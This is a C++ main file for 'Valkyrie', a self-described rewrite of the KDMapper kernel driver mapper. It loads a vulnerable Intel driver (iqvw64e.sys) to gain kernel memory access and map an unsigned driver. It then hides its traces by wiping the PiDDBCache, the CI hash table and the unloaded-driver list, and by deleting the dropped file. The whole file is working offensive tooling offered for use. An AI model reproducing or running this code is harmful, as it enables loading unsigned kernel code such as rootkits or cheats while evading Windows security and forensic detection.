// Code by Cyril "Parad0x141" Bouvier - 2025

// This is a work in progress even if the most of the main features are impl and working,
// you can map drivers right now :)

// Stealth kit is not complete yet.


// Valkyrie is a clean and complete rewrite of KDMapper by TheCruz
// with added stealth features & various code/features improvements by Parad0x141
// Original KDMapper repo -> https://github.com/TheCruZ/kdmapper Many thanks to TheCruz for sharing his work <3






#include "Args.hpp"
#include "Common.hpp"
#include "PDBParser.hpp"
#include "ValkyrieMapper.hpp"
#include "DebugTools.hpp"
#include "PatternScanner.hpp"




void MapDriver(IntelLoader& loader, ValkyrieMapper& mapper)
{
	std::string driverPath = "C:\\HelloWorld.sys";

	auto pe = PEUtils::ParsePE(driverPath);
	if (!pe || !PEUtils::ValidateDriverPE(*pe))
	{
		LOG_ERROR("Error invalid driver PE");
		return;
	}

	NTSTATUS exitCode = 0;
	ULONG64 mappedBase = mapper.MapDriver(*pe,
		0, 0, false,
		AllocationMode::AllocateIndependentPages,
		false, nullptr, &exitCode);

}






int wmain(int argc, wchar_t* arvg[])
{

	rang::setControlMode(rang::control::Force);


	if (!IsAdmin())
	{
		LOG_ERROR("Valkyrie require admin right. Please launch as admin.");
		std::wcin.ignore();
		return 1;
	}



	IntelLoader loader;
	loader.SetKernelBaseAddress();

	StealthKit hushPuppy(loader);



	LOG_SUCCESS(" Dropping driver...\n");
	if (!WriteDriver()) 
	{
		std::wcout << L"[-] Failed to write driver\n" << std::flush;
		return 1;
	}


	LOG_SUCCESS("Loading vulnerable driver...\n");
	if (!loader.LoadVulnDriver())
	{
		std::wcout << L"[-] Failed to load driver\n" << std::flush;
		DeleteDriverFile();
		return 1;
	}


	Sleep(1000);

	LOG_SUCCESS("[+] Opening device...");
	if (!loader.OpenDevice()) 
	{
		LOG_SUCCESS("[-] Failed to open device");
		loader.UnloadVulnDriver();
		DeleteDriverFile();
		return 1;
	}


	uint64_t ntos = PEUtils::GetModuleBaseAddress("ntoskrnl.exe");
	if (!ntos)
	{
		std::wcout << L"[-] Failed to find ntoskrnl.exe\n" << std::flush;
		loader.UnloadVulnDriver();
		DeleteDriverFile();
		return 1;
	}

	uint16_t dos = 0;
	if (loader.ReadMemory(ntos, &dos, sizeof(dos)) && dos == IMAGE_DOS_SIGNATURE)
		LOG_SUCCESS_HEX("[+] DOS signature valid 0x", dos);
	else
		LOG_ERROR("Invalid DOS signature\n");



	// Dumb self test to check if the vulnerable driver read works fine.
	uint64_t psGetCurrentProcessId = loader.GetKernelModuleExport(ntos, "PsGetCurrentProcessId");
	if (!psGetCurrentProcessId)
	{
		LOG_ERROR("[-] PsGetCurrentProcessId export not found");
		loader.UnloadVulnDriver();
		DeleteDriverFile();
		return 1;
	}


	ValkyrieMapper mapper(loader);
	MapDriver(loader, mapper);



	ULONG timestamp = GetPETimeStamp(loader.GetDriverPath());
	ValkStatus status = hushPuppy.CleanPiDDBCache(L"iqvw64e.sys", timestamp);
	status = hushPuppy.ClearCIHashTable();

	loader.ClearMmUnloadedDrivers();
	loader.UnloadVulnDriver();

	DeleteDriverFile();

	LOG_SUCCESS("Driver loaded successfully – press ENTER to exit");
	std::cin.get();
	return 0;


}